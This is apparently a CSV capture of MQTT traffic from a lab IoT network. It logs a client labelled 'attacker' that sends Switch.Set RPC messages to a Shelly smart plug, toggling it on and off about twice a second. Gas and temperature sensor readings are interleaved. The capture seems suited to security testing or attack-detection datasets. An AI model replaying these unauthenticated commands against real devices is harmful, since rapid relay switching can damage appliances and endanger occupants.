2026-04-22T16:17:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33211.36,""swi"
2026-04-22T16:17:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3598 33211.385 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3599 33211.867 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33211.86,""swi"
2026-04-22T16:17:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3600 33211.883 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3601 33212.372 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33212.37,""swi"
2026-04-22T16:17:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3602 33212.391 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3603 33212.870 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33212.87,""swi"
2026-04-22T16:18:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3604 33212.887 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3605 33213.370 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33213.37,""swi"
2026-04-22T16:18:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3606 33213.389 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3607 33213.869 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33213.87,""swi"
2026-04-22T16:18:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3608 33213.886 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3609 33214.372 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33214.37,""swi"
2026-04-22T16:18:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3610 33214.391 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3611 33214.870 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33214.87,""swi"
2026-04-22T16:18:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3612 33214.886 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3613 33215.371 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33215.37,""swi"
2026-04-22T16:18:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3614 33215.390 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3615 33215.871 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33215.87,""swi"
2026-04-22T16:18:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3616 33215.888 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3617 33216.371 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33216.37,""swi"
2026-04-22T16:18:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3618 33216.390 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3619 33216.879 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33216.88,""swi"
2026-04-22T16:18:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3620 33216.895 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3621 33217.372 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33217.37,""swi"
2026-04-22T16:18:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3622 33217.391 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3623 33217.873 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33217.87,""swi"
2026-04-22T16:18:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3624 33217.890 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3625 33218.378 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33218.37,""swi"
2026-04-22T16:18:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3626 33218.396 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3627 33218.884 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33218.88,""swi"
2026-04-22T16:18:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3628 33218.900 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:18:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:18:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:18:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:18:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:18:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3629 33219.382 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33219.38,""swi"
2026-04-22T16:18:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3630 33219.401 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3631 33219.882 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33219.88,""swi"
2026-04-22T16:18:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3632 33219.899 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3633 33220.382 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33220.38,""swi"
2026-04-22T16:18:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3634 33220.401 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3635 33220.883 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33220.88,""swi"
2026-04-22T16:18:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3636 33220.900 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3637 33221.384 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33221.38,""swi"
2026-04-22T16:18:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3638 33221.403 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3639 33221.885 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33221.88,""swi"
2026-04-22T16:18:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3640 33221.902 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:18:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:18:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3641 33222.386 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33222.38,""swi"
2026-04-22T16:18:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3642 33222.404 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3643 33222.886 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33222.88,""swi"
2026-04-22T16:18:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3644 33222.902 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3645 33223.386 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:18:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33223.38,""swi"
2026-04-22T16:18:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3646 33223.406 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:18:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:18:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:18:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3647 33223.887 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:18:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33223.88,""swi"
2026-04-22T16:18:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3648 33223.903 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:18:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:18:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:18:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3649 33224.387 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:18:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
